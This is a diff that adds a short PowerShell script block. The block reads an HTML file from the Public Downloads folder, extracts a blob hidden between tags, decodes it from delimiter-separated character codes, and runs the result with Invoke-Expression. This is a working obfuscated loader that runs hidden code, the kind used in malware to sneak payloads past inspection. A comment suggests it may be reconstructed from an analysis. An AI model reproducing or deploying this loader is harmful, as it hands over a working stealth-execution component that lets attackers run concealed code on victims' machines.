@@ -1,0 +1,16 @@
+$extractionLogic = {
+    $path = "C:\Users\Public\Downloads\test.html"
+    if (Test-Path $path) {
+        $content = Get-Content -Path $path -Raw
+        if ($content -match "<tag>(.*)</tag>") {
+            $encodedBlob = $matches[1]
+            $chunks = $encodedBlob -split "dmr"
+            $payloadString = ""
+            foreach ($chunk in $chunks) {
+                if ($chunk) { $payloadString += [char][int]$chunk }
+            }
+            # The reconstructed string 'payloadString' is now executed
+            Invoke-Expression -Command $payloadString
+        }
+    }
+}
